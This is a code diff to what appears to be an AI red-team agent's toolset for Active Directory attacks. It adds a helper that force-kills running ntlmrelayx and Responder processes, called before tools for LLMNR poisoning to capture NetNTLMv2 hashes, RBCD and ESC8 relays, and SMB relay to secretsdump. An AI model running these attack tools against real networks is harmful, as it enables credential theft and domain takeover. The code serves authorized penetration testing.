@@ -5,6 +5,8 @@ This module provides toolsets for:
 - Responder and mitm6 for capturing/relaying credentials
 """
 
+import time
+
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
 from loguru import logger
@@ -13,6 +15,37 @@ from ares.tools.red.common import (
     AnyRedTeamState,
     run_tool,
 )
+
+
+def _kill_existing_relay_processes() -> str:
+    """Kill any existing ntlmrelayx/responder processes to free ports.
+
+    Returns:
+        Status message about what was killed.
+    """
+    killed = []
+
+    # Kill ntlmrelayx processes
+    try:
+        _stdout, _, code = run_tool(["pkill", "-9", "-f", "ntlmrelayx"], timeout_seconds=5)
+        if code == 0:
+            killed.append("ntlmrelayx")
+    except Exception:
+        pass
+
+    # Kill responder processes
+    try:
+        _stdout, _, code = run_tool(["pkill", "-9", "-f", "Responder.py"], timeout_seconds=5)
+        if code == 0:
+            killed.append("responder")
+    except Exception:
+        pass
+
+    if killed:
+        # Brief pause for ports to be released
+        time.sleep(1)
+        return f"Killed existing processes: {', '.join(killed)}"
+    return ""
 
 
 class CoercionTools(Toolset):
@@ -133,6 +166,11 @@ class CoercionNetworkTools(Toolset):
         """Poison LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes."""
         from ares.core.config import get_default_network_interface
 
+        # Kill any existing relay/responder processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
+
         if not interface:
             interface = get_default_network_interface()
 
@@ -191,6 +229,11 @@ class CoercionNetworkTools(Toolset):
         delegate_access: bool = True,
     ) -> str:
         """Relay to LDAPS for RBCD attack. Creates machine account with --delegate-access."""
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
+
         cmd = ["ntlmrelayx.py", "-t", f"ldaps://{dc_ip}", "--no-smb-server"]
 
         if delegate_access:
@@ -218,6 +261,11 @@ class CoercionNetworkTools(Toolset):
         template: str = "DomainController",
     ) -> str:
         """ESC8 relay to ADCS web enrollment. Coerce DC to get its certificate."""
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
+
         cmd = [
             "ntlmrelayx.py",
             "-t",
@@ -251,6 +299,11 @@ class CoercionNetworkTools(Toolset):
         interactive: bool = False,
     ) -> str:
         """Relay to SMB (requires signing disabled). SOCKS proxy for secretsdump."""
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
+
         cmd = [
             "ntlmrelayx.py",
             "-t",
@@ -300,6 +353,11 @@ class CoercionNetworkTools(Toolset):
         """Relay to multiple SMB targets. Provide targets_file or comma-separated target_ips."""
         if not targets_file and not target_ips:
             return "Error: Provide either targets_file or target_ips"
+
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
 
         cmd = [
             "ntlmrelayx.py",
